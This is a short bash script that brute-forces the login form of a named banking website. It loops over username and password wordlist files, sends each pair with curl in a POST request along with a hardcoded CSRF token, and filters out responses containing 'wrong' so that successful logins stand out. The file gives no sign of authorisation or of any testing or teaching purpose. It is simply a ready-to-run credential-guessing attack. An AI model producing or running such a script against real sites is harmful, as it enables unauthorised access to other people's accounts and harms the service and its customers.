#!/usr/bin/env bash
siteUrl="https://mazaya.alinma.com/login"

vUsernameParam="identifier"
vPasswordParam="password"
guessUsernameList=("user1" "user2" "user3" "user4")
guessPasswordList=("pass1" "pass2" "pass3" "pass4")
csrf_token="3837e4174ea37a982e6fb2d7ffe6cedf"

#for vUsername in "${guessUsernameList[@]}"
#do
#    for vPassword in "${guessPasswordList[@]}"
#    do
#        echo curl -X  POST ${siteUrl} -s -d ${vUsernameParam}"="${vUsername}"&"${vPasswordParam}"="${vPassword} | grep -v "wrong"
#        curl -X  POST ${siteUrl} -s -d ${vUsernameParam}"="${vUsername}"&"${vPasswordParam}"="${vPassword} | grep -v "wrong"
#    done
#done


while read vUsername; do
  #echo "$vUsername"
  while read vPassword; do
    #echo "$vUsername"/"$vPassword"
    #echo curl -X  POST ${siteUrl} -s -d ${vUsernameParam}"="${vUsername}"&"${vPasswordParam}"="${vPassword} | grep -v "wrong"
    curl -X  POST ${siteUrl} -v -d ${vUsernameParam}"="${vUsername}"&"${vPasswordParam}"="${vPassword}"&csrf_token="${csrf_token} | grep -v "wrong"
  done <passwords.txt
done <usernames.txt